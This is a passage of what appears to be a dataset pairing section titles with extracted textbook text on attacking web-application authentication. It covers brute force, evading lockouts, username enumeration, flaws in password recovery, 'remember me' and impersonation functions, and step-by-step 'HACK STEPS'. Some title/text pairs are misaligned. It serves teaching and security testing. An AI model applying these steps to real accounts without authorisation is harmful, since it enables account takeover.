message.\nIn some applications, client-side controls are employed in an attempt to\nprevent password-guessing attacks. For example, an application may set a\ncookie such as failedlogins=1 and increment it following each unsuccess-\nful attempt. When a certain threshold is reached, the server detects this in\nthe submitted cookie and refuses to process the login attempt. This kind\nof client-side defense may prevent a manual attack from being launched\nusing only a browser, but it can, of course, be bypassed easily, as described in\nChapter 5.\ncc0066..iinndddd 116633 88//1199//22001111 1122::0066::3377 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 164\n164 Chapter 6 n Attacking Authentication\nFigure 6-2: A successful password-guessing attack\nA variation on the preceding vulnerability occurs when the failed login counter\nis held within the current session. Although there may be no indication of this on\nthe client side, all the attacker needs to do is obtain a fresh session (for example, by\nwithholding his session cookie), and he can continue his password-guessing attack.\nFinally, in some cases, the application locks out a targeted account after\na suitable number of failed logins. However, it responds to additional login\nattempts with messages that indicate (or allow an attacker to infer) whether\nthe supplied password was correct. This means that an attacker can complete\nhis password-guessing attack even though the targeted account is locked out.\nIf the application automatically unlocks accounts after a certain delay, the\nattacker simply needs to wait for this to occur and then log in as usual with\nthe discovered password.\nHACK STEPS\n1. Manually submit several bad login attempts for an account you control,\nmonitoring the error messages you receive.\n2. After about 10 failed logins, if the application has not returned a message\nabout account lockout, attempt to log in correctly. If this succeeds, there\nis probably no account lockout policy.\ncc0066..iinndddd 116644 88//1199//22001111 1122::0066::3377 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 165\nChapter 6 n Attacking Authentication 165\n3. If the account is locked out, try repeating the exercise using a different\naccount. This time, if the application issues any cookies, use each cookie\nfor only a single login attempt, and obtain a new cookie for each subse-\nquent login attempt.\n4. Also, if the account is locked out, see whether submitting the valid pass-\nword causes any difference in the application’s behavior compared to an\ninvalid password. If so, you can continue a password-guessing attack even\nif the account is locked out.\n5. If you do not control any accounts, attempt to enumerate a valid user-\nname (see the next section) and make several bad logins using this.\nMonitor for any error messages about account lockout.\n6. To mount a brute-force attack, first identify a difference in the applica-\ntion’s behavior in response to successful and failed logins. You can use\nthis fact to discriminate between success and failure during the course of\nthe automated attack.\n7. Obtain a list of enumerated or common usernames and a list of common\npasswords. Use any information obtained about password quality rules to\ntailor the password list so as to avoid superfluous test cases.\n8. Use a suitable tool or a custom script to quickly generate login requests\nusing all permutations of these usernames and passwords. Monitor\nthe server’s responses to identify successful login attempts. Chapter 14\ndescribes in detail various techniques and tools for performing custom-\nized attacks using automation.\n9. If you are targeting several usernames at once, it is usually preferable\nto perform this kind of brute-force attack in a breadth-first rather than\ndepth-first manner. This involves iterating through a list of passwords\n(starting with the most common) and attempting each password in turn\non every username. This approach has two benefits. First, you discover\naccounts with common passwords more quickly. Second, you are less\nlikely to trigger any account lockout defenses, because there is a time\ndelay between successive attempts using each individual account.\nTRY IT!\nhttp://mdsec.net/auth/16/\nhttp://mdsec.net/auth/32/\nhttp://mdsec.net/auth/46/\nhttp://mdsec.net/auth/49/\ncc0066..iinndddd 116655 88//1199//22001111 1122::0066::3377 PPMM"
  },
  {
    "input": "Verbose Failure Messages",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 166\n166 Chapter 6 n Attacking Authentication\nVerbose Failure Messages\nA typical login form requires the user to enter two pieces of information — a\nusername and password. Some applications require several more, such as date\nof birth, a memorable place, or a PIN.\nWhen a login attempt fails, you can of course infer that at least one piece of\ninformation was incorrect. However, if the application tells you which piece of\ninformation was invalid, you can exploit this behavior to considerably diminish\nthe effectiveness of the login mechanism.\nIn the simplest case, where a login requires a username and password, an\napplication might respond to a failed login attempt by indicating whether the\nreason for the failure was an unrecognized username or the wrong password,\nas illustrated in Figure 6-3.\nFigure 6-3: Verbose login failure messages indicating when a valid\nusername has been guessed\nIn this instance, you can use an automated attack to iterate through a large\nlist of common usernames to enumerate which ones are valid. Of course, user-\nnames normally are not considered a secret (they are not masked during login,\nfor instance). However, providing an easy means for an attacker to identify valid\nusernames increases the likelihood that he will compromise the application\ngiven enough time, skill, and effort. A list of enumerated usernames can be\nused as the basis for various subsequent attacks, including password guessing,\nattacks on user data or sessions, or social engineering.\nIn addition to the primary login function, username enumeration can arise\nin other components of the authentication mechanism. In principle, any func-\ntion where an actual or potential username is submitted can be leveraged for\nthis purpose. One location where username enumeration is commonly found\nis the user registration function. If the application allows new users to register\nand specify their own usernames, username enumeration is virtually impos-\nsible to prevent if the application is to prevent duplicate usernames from being\nregistered. Other locations where username enumeration are sometimes found\ncc0066..iinndddd 116666 88//1199//22001111 1122::0066::3377 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 167\nChapter 6 n Attacking Authentication 167\nare the password change and forgotten password functions, as described later\nin this chapter.\nNOTE Many authentication mechanisms disclose usernames either implic-\nitly or explicitly. In a web mail account, the username is often the e-mail\naddress, which is common knowledge by design. Many other sites expose\nusernames within the application without considering the advantage this\ngrants to an attacker, or generate usernames in a way that can be predicted\n(for example, user1842, user1843, and so on).\nIn more complex login mechanisms, where an application requires the user to\nsubmit several pieces of information, or proceed through several stages, verbose\nfailure messages or other discriminators can enable an attacker to target each\nstage of the login process in turn, increasing the likelihood that he will gain\nunauthorized access.\nNOTE This vulnerability may arise in more subtle ways than illustrated here.\nEven if the error messages returned in response to a valid and invalid username\nare superfi cially similar, there may be small differences between them that can\nbe used to enumerate valid usernames. For example, if multiple code paths\nwithin the application return the “same” failure message, there may be minor\ntypographical differences between each instance of the message. In some cases,\nthe application’s responses may be identical on-screen but contain subtle differ-\nences hidden within the HTML source, such as comments or layout differences. If\nno obvious means of enumerating usernames presents itself, you should perform\na close comparison of the application’s responses to valid and invalid usernames.\nYou can use the Comparer tool within Burp Suite to automatically analyze\nand highlight the differences between two application responses, as shown\nin Figure 6-4. This helps you quickly identify whether the username’s validity\nresults in any systematic difference in the application’s responses.\nFigure 6-4: Identifying subtle differences in application responses using Burp Comparer\ncc0066..iinndddd 116677 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 168\n168 Chapter 6 n Attacking Authentication\nHACK STEPS\n1. If you already know one valid username (for example, an account you\ncontrol), submit one login using this username and an incorrect password,\nand another login using a random username.\n2. Record every detail of the server’s responses to each login attempt,\nincluding the status code, any redirects, information displayed on-\nscreen, and any differences hidden in the HTML page source. Use your\nintercepting proxy to maintain a full history of all traffic to and from the\nserver.\n3. Attempt to discover any obvious or subtle differences in the server’s\nresponses to the two login attempts.\n4. If this fails, repeat the exercise everywhere within the application where\na username can be submitted (for example, self-registration, password\nchange, and forgotten password).\n5. If a difference is detected in the server’s responses to valid and invalid\nusernames, obtain a list of common usernames. Use a custom script or\nautomated tool to quickly submit each username, and filter the responses\nthat signify that the username is valid (see Chapter 14).\n6. Before commencing your enumeration exercise, verify whether the appli-\ncation performs any account lockout after a certain number of failed login\nattempts (see the preceding section). If so, it is desirable to design your\nenumeration attack with this fact in mind. For example, if the application\nwill grant you only three failed login attempts with any given account, you\nrun the risk of “wasting” one of these for every username you discover\nthrough automated enumeration. Therefore, when performing your enu-\nmeration attack, do not submit a far-fetched password with each login\nattempt. Instead, submit either a single common password such as pass-\nword1 or the username itself as the password. If password quality rules\nare weak, it is highly likely that some of the attempted logins you perform\nas part of your enumeration exercise will succeed and will disclose both\nthe username and password in a single hit. To set the password field to\nbe the same as the username, you can use the “battering ram” attack\nmode in Burp Intruder to insert the same payload at multiple positions in\nyour login request.\nEven if an application’s responses to login attempts containing valid and\ninvalid usernames are identical in every intrinsic respect, it may still be possible\nto enumerate usernames based on the time taken for the application to respond\nto the login request. Applications often perform very different back-end pro-\ncessing on a login request, depending on whether it contains a valid username.\nFor example, when a valid username is submitted, the application may retrieve\nuser details from a back-end database, perform various processing on these\ncc0066..iinndddd 116688 88//1199//22001111 1122::0066::3388 PPMM"
  },
  {
    "input": "Vulnerable Transmission of Credentials",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 169\nChapter 6 n Attacking Authentication 169\ndetails (for example, checking whether the account is expired), and then validate\nthe password (which may involve a resource-intensive hash algorithm) before\nreturning a generic message if the password is incorrect. The timing difference\nbetween the two responses may be too subtle to detect when working with only\na browser, but an automated tool may be able to discriminate between them.\nEven if the results of such an exercise contain a large ratio of false positives, it\nis still better to have a list of 100 usernames, approximately 50% of which are\nvalid, than a list of 10,000 usernames, approximately 0.5% of which are valid.\nSee Chapter 15 for a detailed explanation of how to detect and exploit this type\nof timing difference to extract information from the application.\nTIP In addition to the login functionality itself, there may be other sources of\ninformation where you can obtain valid usernames. Review all the source code\ncomments discovered during application mapping (see Chapter 4) to identify\nany apparent usernames. Any e-mail addresses of developers or other personnel\nwithin the organization may be valid usernames, either in full or just the user-\nspecifi c prefi x. Any accessible logging functionality may disclose usernames.\nTRY IT!\nhttp://mdsec.net/auth/53/\nhttp://mdsec.net/auth/59/\nhttp://mdsec.net/auth/70/\nhttp://mdsec.net/auth/81/\nhttp://mdsec.net/auth/167/\nVulnerable Transmission of Credentials\nIf an application uses an unencrypted HTTP connection to transmit login cre-\ndentials, an eavesdropper who is suitably positioned on the network can, of\ncourse, intercept them. Depending on the user’s location, potential eavesdrop-\npers may reside:\nn On the user’s local network\nn Within the user’s IT department\nn Within the user’s ISP\nn On the Internet backbone\nn Within the ISP hosting the application\nn Within the IT department managing the application\ncc0066..iinndddd 116699 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 170\n170 Chapter 6 n Attacking Authentication\nNOTE Any of these locations may be occupied by authorized personnel but\nalso potentially by an external attacker who has compromised the relevant\ninfrastructure through some other means. Even if the intermediaries on a par-\nticular network are believed to be trusted, it is safer to use secure transport\nmechanisms when passing sensitive data over it.\nEven if login occurs over HTTPS, credentials may still be disclosed to unau-\nthorized parties if the application handles them in an unsafe manner:\nn If credentials are transmitted as query string parameters, as opposed\nto in the body of a POST request, these are liable to be logged in various\nplaces, such as within the user’s browser history, within the web server\nlogs, and within the logs of any reverse proxies employed within the\nhosting infrastructure. If an attacker succeeds in compromising any of\nthese resources, he may be able to escalate privileges by capturing the\nuser credentials stored there.\nn Although most web applications do use the body of a POST request to\nsubmit the HTML login form itself, it is surprisingly common to see the\nlogin request being handled via a redirect to a different URL with the same\ncredentials passed as query string parameters. Why application develop-\ners consider it necessary to perform these bounces is unclear, but having\nelected to do so, it is easier to implement them as 302 redirects to a URL\nthan as POST requests using a second HTML form submitted via JavaScript.\nn Web applications sometimes store user credentials in cookies, usually\nto implement poorly designed mechanisms for login, password change,\n“remember me,” and so on. These credentials are vulnerable to capture\nvia attacks that compromise user cookies and, in the case of persistent\ncookies, by anyone who gains access to the client’s local fi lesystem. Even if\nthe credentials are encrypted, an attacker still can simply replay the cookie\nand therefore log in as a user without actually knowing her credentials.\nChapters 12 and 13 describe various ways in which an attacker can target\nother users to capture their cookies.\nMany applications use HTTP for unauthenticated areas of the application and\nswitch to HTTPS at the point of login. If this is the case, then the correct place\nto switch to HTTPS is when the login page is loaded in the browser, enabling a\nuser to verify that the page is authentic before entering credentials. However, it\nis common to encounter applications that load the login page itself using HTTP\nand then switch to HTTPS at the point where credentials are submitted. This\nis unsafe, because a user cannot verify the authenticity of the login page itself\nand therefore has no assurance that the credentials will be submitted securely.\nA suitably positioned attacker can intercept and modify the login page, chang-\ning the target URL of the login form to use HTTP. By the time an astute user\nrealizes that the credentials have been submitted using HTTP, they will have\nbeen compromised.\ncc0066..iinndddd 117700 88//1199//22001111 1122::0066::3388 PPMM"
  },
  {
    "input": "Password Change Functionality",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 171\nChapter 6 n Attacking Authentication 171\nHACK STEPS\n1. Carry out a successful login while monitoring all traffic in both directions\nbetween the client and server.\n2. Identify every case in which the credentials are transmitted in either\ndirection. You can set interception rules in your intercepting proxy to flag\nmessages containing specific strings (see Chapter 20).\n3. If any instances are found in which credentials are submitted in a URL\nquery string or as a cookie, or are transmitted back from the server to the\nclient, understand what is happening, and try to ascertain what purpose\nthe application developers were attempting to achieve. Try to find every\nmeans by which an attacker might interfere with the application’s logic to\ncompromise other users’ credentials.\n4. If any sensitive information is transmitted over an unencrypted channel,\nthis is, of course, vulnerable to interception.\n5. If no cases of actual credentials being transmitted insecurely are iden-\ntified, pay close attention to any data that appears to be encoded or\nobfuscated. If this includes sensitive data, it may be possible to reverse-\nengineer the obfuscation algorithm.\n6. If credentials are submitted using HTTPS but the login form is loaded\nusing HTTP, the application is vulnerable to a man-in-the-middle attack,\nwhich may be used to capture credentials.\nTRY IT!\nhttp://mdsec.net/auth/88/\nhttp://mdsec.net/auth/90/\nhttp://mdsec.net/auth/97/\nPassword Change Functionality\nSurprisingly, many web applications do not provide any way for users to change\ntheir password. However, this functionality is necessary for a well-designed\nauthentication mechanism for two reasons:\nn Periodic enforced password change mitigates the threat of password com-\npromise. It reduces the window in which a given password can be targeted\nin a guessing attack. It also reduces the window in which a compromised\npassword can be used without detection by the attacker.\nn Users who suspect that their passwords may have been compromised\nneed to be able to quickly change their password to reduce the threat of\nunauthorized use.\ncc0066..iinndddd 117711 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 172\n172 Chapter 6 n Attacking Authentication\nAlthough it is a necessary part of an effective authentication mechanism,\npassword change functionality is often vulnerable by design. Vulnerabilities\nthat are deliberately avoided in the main login function often reappear in the\npassword change function. Many web applications’ password change functions\nare accessible without authentication and do the following:\nn Provide a verbose error message indicating whether the requested user-\nname is valid.\nn Allow unrestricted guesses of the “existing password” fi eld.\nn Check whether the “new password” and “confi rm new password” fi elds\nhave the same value only after validating the existing password, thereby\nallowing an attack to succeed in discovering the existing password\nnoninvasively.\nA typical password change function includes a relatively large logical decision\ntree. The application needs to identify the user, validate the supplied existing\npassword, integrate with any account lockout defenses, compare the supplied\nnew passwords with each other and against password quality rules, and feed\nback any error conditions to the user in a suitable way. Because of this, pass-\nword change functions often contain subtle logic fl aws that can be exploited to\nsubvert the entire mechanism.\nHACK STEPS\n1. Identify any password change functionality within the application. If\nthis is not explicitly linked from published content, it may still be imple-\nmented. Chapter 4 describes various techniques for discovering hidden\ncontent within an application.\n2. Make various requests to the password change function using invalid\nusernames, invalid existing passwords, and mismatched “new password”\nand “confirm new password” values.\n3. Try to identify any behavior that can be used for username enumeration\nor brute-force attacks (as described in the “Brute-Forcible Login” and\n“Verbose Failure Messages” sections).\nTIP If the password change form is accessible only by authenticated users\nand does not contain a username fi eld, it may still be possible to supply an\narbitrary username. The form may store the username in a hidden fi eld, which\ncan easily be modifi ed. If not, try supplying an additional parameter contain-\ning the username, using the same parameter name as is used in the main\nlogin form. This trick sometimes succeeds in overriding the username of the\ncurrent user, enabling you to brute-force the credentials of other users even\nwhen this is not possible at the main login.\ncc0066..iinndddd 117722 88//1199//22001111 1122::0066::3388 PPMM"
  },
  {
    "input": "Forgotten Password Functionality",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 173\nChapter 6 n Attacking Authentication 173\nTRY IT!\nhttp://mdsec.net/auth/104/\nhttp://mdsec.net/auth/117/\nhttp://mdsec.net/auth/120/\nhttp://mdsec.net/auth/125/\nhttp://mdsec.net/auth/129/\nhttp://mdsec.net/auth/135/\nForgotten Password Functionality\nLike password change functionality, mechanisms for recovering from a forgot-\nten password situation often introduce problems that may have been avoided\nin the main login function, such as username enumeration.\nIn addition to this range of defects, design weaknesses in forgotten pass-\nword functions frequently make this the weakest link at which to attack the\napplication’s overall authentication logic. Several kinds of design weaknesses\ncan often be found:\nn Forgotten password functionality often involves presenting the user with\na secondary challenge in place of the main login, as shown in Figure 6-5.\nThis challenge is often much easier for an attacker to respond to than\nattempting to guess the user’s password. Questions about mothers’ maiden\nnames, memorable dates, favorite colors, and the like generally will have a\nmuch smaller set of potential answers than the set of possible passwords.\nFurthermore, they often concern information that is publicly known or\nthat a determined attacker can discover with a modest degree of effort.\nFigure 6-5: A secondary challenge used in an account\nrecovery function\nIn many cases, the application allows users to set their own password\nrecovery challenge and response during registration. Users are inclined\ncc0066..iinndddd 117733 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 174\n174 Chapter 6 n Attacking Authentication\nto set extremely insecure challenges, presumably on the false assumption\nthat only they will ever be presented with them. An example is “Do I own\na boat?” In this situation, an attacker who wants to gain access can use\nan automated attack to iterate through a list of enumerated or common\nusernames, log all the password recovery challenges, and select those that\nappear most easily guessable. (See Chapter 14 for techniques regarding\nhow to grab this kind of data in a scripted attack.)\nn As with password change functionality, application developers commonly\noverlook the possibility of brute-forcing the response to a password recov-\nery challenge, even when they block this attack on the main login page. If\nan application allows unrestricted attempts to answer password recovery\nchallenges, it is highly likely to be compromised by a determined attacker.\nn In some applications, the recovery challenge is replaced with a simple\npassword “hint” that is confi gured by users during registration. Users\ncommonly set extremely obvious hints, perhaps even one that is identi-\ncal to the password itself, on the false assumption that only they will\never see them. Again, an attacker with a list of common or enumerated\nusernames can easily capture a large number of password hints and then\nstart guessing.\nn The mechanism by which an application enables users to regain control of\ntheir account after correctly responding to a challenge is often vulnerable.\nOne reasonably secure means of implementing this is to send a unique,\nunguessable, time-limited recovery URL to the e-mail address that the\nuser provided during registration. Visiting this URL within a few minutes\nenables the user to set a new password. However, other mechanisms for\naccount recovery are often encountered that are insecure by design:\nn Some applications disclose the existing, forgotten password to the user\nafter successful completion of a challenge, enabling an attacker to use\nthe account indefi nitely without any risk of detection by the owner.\nEven if the account owner subsequently changes the blown password,\nthe attacker can simply repeat the same challenge to obtain the new\npassword.\nn Some applications immediately drop the user into an authenticated\nsession after successful completion of a challenge, again enabling an\nattacker to use the account indefi nitely without detection, and without\never needing to know the user’s password.\nn Some applications employ the mechanism of sending a unique recov-\nery URL but send this to an e-mail address specifi ed by the user at the\ntime the challenge is completed. This provides absolutely no enhanced\nsecurity for the recovery process beyond possibly logging the e-mail\naddress used by an attacker.\ncc0066..iinndddd 117744 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 175\nChapter 6 n Attacking Authentication 175\nTIP Even if the application does not provide an on-screen fi eld for you to pro-\nvide an e-mail address to receive the recovery URL, the application may transmit\nthe address via a hidden form fi eld or cookie. This presents a double opportunity:\nyou can discover the e-mail address of the user you have compromised, and you\ncan modify its value to receive the recovery URL at an address of your choosing.\nn Some applications allow users to reset their password’s value directly\nafter successful completion of a challenge and do not send any e-mail\nnotifi cation to the user. This means that the compromising of an account\nby an attacker will not be noticed until the owner attempts to log in\nagain. It may even remain unnoticed if the owner assumes that she\nmust have forgotten her password and therefore resets it in the same\nway. An attacker who simply desires some access to the application can\nthen compromise a different user’s account for a period of time and\ntherefore can continue using the application indefi nitely.\nHACK STEPS\n1. Identify any forgotten password functionality within the application. If\nthis is not explicitly linked from published content, it may still be imple-\nmented (see Chapter 4).\n2. Understand how the forgotten password function works by doing a\ncomplete walk-through using an account you control.\n3. If the mechanism uses a challenge, determine whether users can set or\nselect their own challenge and response. If so, use a list of enumerated or\ncommon usernames to harvest a list of challenges, and review this for any\nthat appear easily guessable.\n4. If the mechanism uses a password “hint,” do the same exercise to harvest\na list of password hints, and target any that are easily guessable.\n5. Try to identify any behavior in the forgotten password mechanism that\ncan be exploited as the basis for username enumeration or brute-force\nattacks (see the previous details).\n6. If the application generates an e-mail containing a recovery URL in\nresponse to a forgotten password request, obtain a number of these URLs,\nand attempt to identify any patterns that may enable you to predict the\nURLs issued to other users. Employ the same techniques as are relevant to\nanalyzing session tokens for predictability (see Chapter 7).\nTRY IT!\nhttp://mdsec.net/auth/142/\nhttp://mdsec.net/auth/145/\nhttp://mdsec.net/auth/151/\ncc0066..iinndddd 117755 88//1199//22001111 1122::0066::3388 PPMM"
  },
  {
    "input": "\"Remember Me\" Functionality",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 176\n176 Chapter 6 n Attacking Authentication\n“Remember Me” Functionality\nApplications often implement “remember me” functions as a convenience to\nusers. This way, users don’t need to reenter their username and password each\ntime they use the application from a specifi c computer. These functions are\noften insecure by design and leave the user exposed to attack both locally and\nby users on other computers:\nn Some “remember me” functions are implemented using a simple per-\nsistent cookie, such as RememberUser=daf (see Figure 6-6). When this\ncookie is submitted to the initial application page, the application trusts\nthe cookie to authenticate the user, and it creates an application session\nfor that person, bypassing the login. An attacker can use a list of common\nor enumerated usernames to gain full access to the application without\nany authentication.\nFigure 6-6: A vulnerable “remember me” function, which automatically logs in a\nuser based solely on a username stored in a cookie\ncc0066..iinndddd 117766 88//1199//22001111 1122::0066::3399 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 177\nChapter 6 n Attacking Authentication 177\nn Some “remember me” functions set a cookie that contains not the username\nbut a kind of persistent session identifi er, such as RememberUser=1328.\nWhen the identifi er is submitted to the login page, the application looks\nup the user associated with it and creates an application session for\nthat user. As with ordinary session tokens, if the session identifi ers of\nother users can be predicted or extrapolated, an attacker can iterate\nthrough a large number of potential identifi ers to fi nd those associ-\nated with application users, and therefore gain access to their accounts\nwithout authentication. See Chapter 7 for techniques for performing\nthis attack.\nn Even if the information stored for reidentifying users is suitably protected\n(encrypted) to prevent other users from determining or guessing it, the\ninformation may still be vulnerable to capture through a bug such as\ncross-site scripting (see Chapter 12), or by an attacker who has local access\nto the user’s computer.\nHACK STEPS\n1. Activate any “remember me” functionality, and determine whether the\nfunctionality indeed does fully “remember” the user or whether it remem-\nbers only his username and still requires him to enter a password on sub-\nsequent visits. If the latter is the case, the functionality is much less likely\nto expose any security flaw.\n2. Closely inspect all persistent cookies that are set, and also any data that\nis persisted in other local storage mechanisms, such as Internet Explorer’s\nuserData, Silverlight isolated storage, or Flash local shared objects. Look\nfor any saved data that identifies the user explicitly or appears to contain\nsome predictable identifier of the user.\n3. Even where stored data appears to be heavily encoded or obfuscated,\nreview this closely. Compare the results of “remembering” several very\nsimilar usernames and/or passwords to identify any opportunities to\nreverse-engineer the original data. Here, use the same techniques that\nare described in Chapter 7 to detect meaning and patterns in session\ntokens.\n4. Attempt to modify the contents of the persistent cookie to try to con-\nvince the application that another user has saved his details on your\ncomputer.\ncc0066..iinndddd 117777 88//1199//22001111 1122::0066::3399 PPMM"
  },
  {
    "input": "User Impersonation Functionality",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 178\n178 Chapter 6 n Attacking Authentication\nTRY IT!\nhttp://mdsec.net/auth/219/\nhttp://mdsec.net/auth/224/\nhttp://mdsec.net/auth/227/\nhttp://mdsec.net/auth/229/\nhttp://mdsec.net/auth/232/\nhttp://mdsec.net/auth/236/\nhttp://mdsec.net/auth/239/\nhttp://mdsec.net/auth/245/\nUser Impersonation Functionality\nSome applications implement the facility for a privileged user of the application\nto impersonate other users in order to access data and carry out actions within\ntheir user context. For example, some banking applications allow helpdesk opera-\ntors to verbally authenticate a telephone user and then switch their application\nsession into that user’s context to assist him or her.\nVarious design fl aws commonly exist within impersonation functionality:\nn It may be implemented as a “hidden” function, which is not subject to\nproper access controls. For example, anyone who knows or guesses the\nURL/admin/ImpersonateUser.jsp may be able to make use of the func-\ntion and impersonate any other user (see Chapter 8).\nn The application may trust user-controllable data when determining whether\nthe user is performing impersonation. For example, in addition to a valid\nsession token, a user may submit a cookie specifying which account his\nsession is currently using. An attacker may be able to modify this value\nand gain access to other user accounts without authentication, as shown\nin Figure 6-7.\nn If an application allows administrative users to be impersonated, any weak-\nness in the impersonation logic may result in a vertical privilege escalation\nvulnerability. Rather than simply gaining access to other ordinary users’\ndata, an attacker may gain full control of the application.\nn Some impersonation functionality is implemented as a simple “backdoor”\npassword that can be submitted to the standard login page along with any\nusername to authenticate as that user. This design is highly insecure for\nmany reasons, but the biggest opportunity for attackers is that they are\nlikely to discover this password when performing standard attacks such\nas brute-forcing of the login. If the backdoor password is matched before\nthe user’s actual password, the attacker is likely to discover the function of\ncc0066..iinndddd 117788 88//1199//22001111 1122::0066::3399 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 179\nChapter 6 n Attacking Authentication 179\nthe backdoor password and therefore gain access to every user’s account.\nSimilarly, a brute-force attack might result in two different “hits,” thereby\nrevealing the backdoor password, as shown in Figure 6-8.\nFigure 6-7: A vulnerable user impersonation function\nHACK STEPS\n1. Identify any impersonation functionality within the application. If this is\nnot explicitly linked from published content, it may still be implemented\n(see Chapter 4).\n2. Attempt to use the impersonation functionality directly to impersonate\nother users.\n3. Attempt to manipulate any user-supplied data that is processed by the\nimpersonation function in an attempt to impersonate other users. Pay\nparticular attention to any cases where your username is being submitted\nother than during normal login.\n4. If you succeed in making use of the functionality, attempt to impersonate\nany known or guessed administrative users to elevate privileges.\n5. When carrying out password-guessing attacks (see the “Brute-Forcible\nLogin” section), review whether any users appear to have more than one\nvalid password, or whether a specific password has been matched against\nseveral usernames. Also, log in as many different users with the credentials\ncaptured in a brute-force attack, and review whether everything appears\nnormal. Pay close attention to any “logged in as X” status message.\ncc0066..iinndddd 117799 88//1199//22001111 1122::0066::3399 PPMM"
  },
  {
    "input": "Incomplete Validation of Credentials",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 180\n180 Chapter 6 n Attacking Authentication\nTRY IT!\nhttp://mdsec.net/auth/272/\nhttp://mdsec.net/auth/290/\nFigure 6-8: A password-guessing attack with two “hits,” indicating the\npresence of a backdoor password\nIncomplete Validation of Credentials\nWell-designed authentication mechanisms enforce various requirements on\npasswords, such as a minimum length or the presence of both uppercase and\nlowercase characters. Correspondingly, some poorly designed authentication\nmechanisms not only do not enforce these good practices but also do not take\ninto account users’ own attempts to comply with them.\nFor example, some applications truncate passwords and therefore validate\nonly the fi rst n characters. Some applications perform a case-insensitive check\nof passwords. Some applications strip unusual characters (sometimes on the\npretext of performing input validation) before checking passwords. In recent\ntimes, behavior of this kind has been identifi ed in some surprisingly high-profi le\nweb applications, usually as a result of trial and error by curious users.\ncc0066..iinndddd 118800 88//1199//22001111 1122::0066::3399 PPMM"
  },
  {
    "input": "Nonunique Usernames",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 181\nChapter 6 n Attacking Authentication 181\nEach of these limitations on password validation reduces by an order of\nmagnitude the number of variations available in the set of possible passwords.\nThrough experimentation, you can determine whether a password is being\nfully validated or whether any limitations are in effect. You can then fi ne-tune\nyour automated attacks against the login to remove unnecessary test cases,\nthereby massively reducing the number of requests necessary to compromise\nuser accounts.\nHACK STEPS\n1. Using an account you control, attempt to log in with variations on your\nown password: removing the last character, changing the case of a char-\nacter, and removing any special typographical characters. If any of these\nattempts is successful, continue experimenting to try to understand what\nvalidation is actually occurring.\n2. Feed any results back into your automated password-guessing attacks to\nremove superfluous test cases and improve the chances of success.\nTRY IT!\nhttp://mdsec.net/auth/293/\nNonunique Usernames\nSome applications that support self-registration allow users to specify their\nown username and do not enforce a requirement that usernames be unique.\nAlthough this is rare, the authors have encountered more than one application\nwith this behavior.\nThis represents a design fl aw for two reasons:\nn One user who shares a username with another user may also happen to\nselect the same password as that user, either during registration or in a\nsubsequent password change. In this eventuality, the application either\nrejects the second user’s chosen password or allows two accounts to\nhave identical credentials. In the fi rst instance, the application’s behavior\neffectively discloses to one user the credentials of the other user. In the\nsecond instance, subsequent logins by one of the users result in access to\nthe other user’s account.\nn An attacker may exploit this behavior to carry out a successful brute-force\nattack, even though this may not be possible elsewhere due to restrictions\non failed login attempts. An attacker can register a specifi c username\ncc0066..iinndddd 118811 88//1199//22001111 1122::0066::3399 PPMM"
  },
  {
    "input": "Predictable Usernames",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 182\n182 Chapter 6 n Attacking Authentication\nmultiple times with different passwords while monitoring for the dif-\nferential response that indicates that an account with that username\nand password already exists. The attacker will have ascertained a target\nuser’s password without making a single attempt to log in as that user.\nBadly designed self-registration functionality can also provide a means for\nusername enumeration. If an application disallows duplicate usernames, an\nattacker may attempt to register large numbers of common usernames to iden-\ntify the existing usernames that are rejected.\nHACK STEPS\n1. If self-registration is possible, attempt to register the same username\ntwice with different passwords.\n2. If the application blocks the second registration attempt, you can exploit\nthis behavior to enumerate existing usernames even if this is not possible\non the main login page or elsewhere. Make multiple registration attempts\nwith a list of common usernames to identify the already registered names\nthat the application blocks.\n3. If the registration of duplicate usernames succeeds, attempt to register\nthe same username twice with the same password, and determine the\napplication’s behavior:\na. If an error message results, you can exploit this behavior to carry out a\nbrute-force attack, even if this is not possible on the main login page.\nTarget an enumerated or guessed username, and attempt to register\nthis username multiple times with a list of common passwords. When\nthe application rejects a specific password, you have probably found\nthe existing password for the targeted account.\nb. If no error message results, log in using the credentials you speci-\nfied, and see what happens. You may need to register several users,\nand modify different data held within each account, to understand\nwhether this behavior can be used to gain unauthorized access to\nother users’ accounts.\nPredictable Usernames\nSome applications automatically generate account usernames according to\na predictable sequence (cust5331, cust5332, and so on). When an application\nbehaves like this, an attacker who can discern the sequence can quickly arrive\nat a potentially exhaustive list of all valid usernames, which can be used as\nthe basis for further attacks. Unlike enumeration methods that rely on making\nrepeated requests driven by wordlists, this means of determining usernames\ncan be carried out nonintrusively with minimal interaction with the application.\ncc0066..iinndddd 118822 88//1199//22001111 1122::0066::4400 PPMM"
  },
  {
    "input": "Predictable Initial Passwords",
